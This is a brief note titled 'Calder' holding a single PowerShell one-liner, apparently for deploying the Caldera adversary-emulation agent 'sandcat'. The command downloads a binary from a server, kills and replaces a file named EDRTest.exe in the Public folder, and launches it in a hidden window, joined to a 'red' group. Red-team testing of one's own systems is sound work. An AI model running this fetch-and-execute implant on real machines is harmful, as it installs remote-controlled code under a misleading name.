# Calder


$server="http://localhost:8888";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "C:\Users\Public\EDRTest.exe"} | stop-process -f;rm -force "C:\Users\Public\EDRTest.exe" -ea ignore;[io.file]::WriteAllBytes("C:\Users\Public\EDRTest.exe",$data) | Out-Null;Start-Process -FilePath C:\Users\Public\EDRTest.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
